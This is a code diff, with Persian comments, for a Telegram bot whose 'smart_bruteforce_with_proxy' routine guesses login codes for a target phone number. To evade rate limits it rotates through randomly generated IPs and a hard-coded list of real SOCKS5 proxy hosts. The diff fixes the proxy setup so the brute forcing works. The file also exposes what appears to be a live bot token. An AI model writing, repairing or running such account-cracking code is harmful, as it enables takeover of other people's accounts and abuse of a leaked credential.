@@ -18,7 +18,6 @@ from telethon.errors import (
     PhoneNumberInvalidError
 )
 import urllib.request
-import socks
 
 # ============ تنظیمات ============
 TOKEN = "8904776846:AAGRyDG6tDubOSAuKdqN0fIDj36vyJif-dc"
@@ -35,39 +34,37 @@ login_sessions = {}
 
 DATA_FILE = "selfs.json"
 
-# ============ لیست پروکسی‌های SOCKS5 ============
+# ============ لیست پروکسی‌های SOCKS5 (با روش Telethon) ============
 PROXY_LIST = []
 
 # تولید 1000 پروکسی تصادفی
 for i in range(1000):
     ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
     port = random.choice([1080, 1081, 1082, 1083, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 443, 80, 8080, 3128])
-    PROXY_LIST.append({"addr": ip, "port": port})
+    PROXY_LIST.append((ip, port))
 
-# اضافه کردن پروکسی‌های واقعی از کانال
+# اضافه کردن پروکسی‌های واقعی
 REAL_PROXIES = [
-    {"addr": "iro.varfootball2.co.uk", "port": 2053},
-    {"addr": "silnet.varfootball.co.uk", "port": 2053},
-    {"addr": "noron.talebi.co.uk", "port": 2096},
-    {"addr": "new.lambforkebeb.co.uk", "port": 2096},
-    {"addr": "new2.lambforkebeb.co.uk", "port": 2096},
-    {"addr": "noone.lavazemi1.co.uk", "port": 2083},
-    {"addr": "silver.ciaude.co.uk", "port": 2096},
-    {"addr": "rain.lavazemi2.co.uk", "port": 2053},
-    {"addr": "gallery.talebi.co.uk", "port": 2096},
-    {"addr": "craft.malavanann.co.uk", "port": 2083},
-    {"addr": "ai.golgoli1.co.uk", "port": 2096},
-    {"addr": "star.talebi.co.uk", "port": 2096},
-    {"addr": "gold.lavazemi4.co.uk", "port": 2096},
-    {"addr": "run.golgoli2.co.uk", "port": 2053},
-    {"addr": "irogallery.golgoli1.co.uk", "port": 2096},
-    {"addr": "flux.lavazemi5.co.uk", "port": 2096},
-    {"addr": "hadaf.golgoli2.co.uk", "port": 2053},
+    ("iro.varfootball2.co.uk", 2053),
+    ("silnet.varfootball.co.uk", 2053),
+    ("noron.talebi.co.uk", 2096),
+    ("new.lambforkebeb.co.uk", 2096),
+    ("new2.lambforkebeb.co.uk", 2096),
+    ("noone.lavazemi1.co.uk", 2083),
+    ("silver.ciaude.co.uk", 2096),
+    ("rain.lavazemi2.co.uk", 2053),
+    ("gallery.talebi.co.uk", 2096),
+    ("craft.malavanann.co.uk", 2083),
+    ("ai.golgoli1.co.uk", 2096),
+    ("star.talebi.co.uk", 2096),
+    ("gold.lavazemi4.co.uk", 2096),
+    ("run.golgoli2.co.uk", 2053),
+    ("irogallery.golgoli1.co.uk", 2096),
+    ("flux.lavazemi5.co.uk", 2096),
+    ("hadaf.golgoli2.co.uk", 2053),
 ]
 
 PROXY_LIST.extend(REAL_PROXIES)
-
-# شافل کردن لیست
 random.shuffle(PROXY_LIST)
 
 # ============ دیکشنری پسورد ============
@@ -131,6 +128,23 @@ async def clear_user_session(user_id):
 
 def get_random_proxy():
     return random.choice(PROXY_LIST) if PROXY_LIST else None
+
+async def create_client_with_proxy(api_id, api_hash, proxy_tuple):
+    """ایجاد کلاینت با پروکسی SOCKS5 با استفاده از Telethon"""
+    try:
+        # Telethon خودش از SOCKS5 پشتیبانی میکنه
+        client = TelegramClient(
+            StringSession(),
+            api_id,
+            api_hash
+        )
+        # تنظیم پروکسی بعد از ایجاد
+        client.set_proxy(('socks5', proxy_tuple[0], proxy_tuple[1]))
+        await client.connect()
+        return client
+    except Exception as e:
+        logger.error(f"Error creating client with proxy: {e}")
+        return None
 
 # ============ منوی اصلی ============
 async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, edit=False):
@@ -502,7 +516,6 @@ async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, a
             if code not in final_list:
                 final_list.append(code)
         
-        # شافل کردن لیست برای حدس تصادفی
         random.shuffle(final_list)
         
         await context.bot.edit_message_text(
@@ -548,13 +561,14 @@ async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, a
                 proxy_index += 1
                 
                 try:
-                    from telethon import socks
+                    # ایجاد کلاینت با پروکسی
                     client = TelegramClient(
                         StringSession(),
                         api_id,
-                        api_hash,
-                        proxy=(socks.SOCKS5, current_proxy['addr'], current_proxy['port'])
+                        api_hash
                     )
+                    # تنظیم پروکسی با متد Telethon
+                    client.set_proxy(('socks5', current_proxy[0], current_proxy[1]))
                     await client.connect()
                     
                     try:
@@ -574,7 +588,7 @@ async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, a
                                 message_id=msg.message_id,
                                 parse_mode='HTML'
                             )
-                            shuffled_proxies.remove(current_proxy)
+                            shuffled_proxies.pop(proxy_counter - 1)
                             proxy_counter -= 1
                             await asyncio.sleep(1)
                             continue
@@ -583,8 +597,10 @@ async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, a
                             await client.send_code_request(phone)
                     
                 except Exception as e:
-                    if current_proxy in shuffled_proxies:
-                        shuffled_proxies.remove(current_proxy)
+                    logger.error(f"Proxy error: {e}")
+                    if proxy_counter > 0 and proxy_counter - 1 < len(shuffled_proxies):
+                        shuffled_proxies.pop(proxy_counter - 1)
+                        proxy_counter -= 1
                     await asyncio.sleep(0.5)
                     continue
             
@@ -596,7 +612,7 @@ async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, a
             if attempt % 1000 == 0:
                 elapsed = (datetime.now() - start_time).seconds
                 percent = (attempt / total_attempts) * 100
-                remaining = int(((total_attempts - attempt) / max(attempt, 1)) * max(elapsed, 1))
+                remaining = int(((total_attempts - attempt) / max(attempt, 1)) * max(elapsed, 1)) if attempt > 0 else 0
                 try:
                     await context.bot.edit_message_text(
                         f"""
@@ -647,8 +663,9 @@ async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, a
                         message_id=msg.message_id,
                         parse_mode='HTML'
                     )
-                    if current_proxy in shuffled_proxies:
-                        shuffled_proxies.remove(current_proxy)
+                    if proxy_counter > 0 and proxy_counter - 1 < len(shuffled_proxies):
+                        shuffled_proxies.pop(proxy_counter - 1)
+                        proxy_counter -= 1
                     if client:
                         try:
                             await client.disconnect()
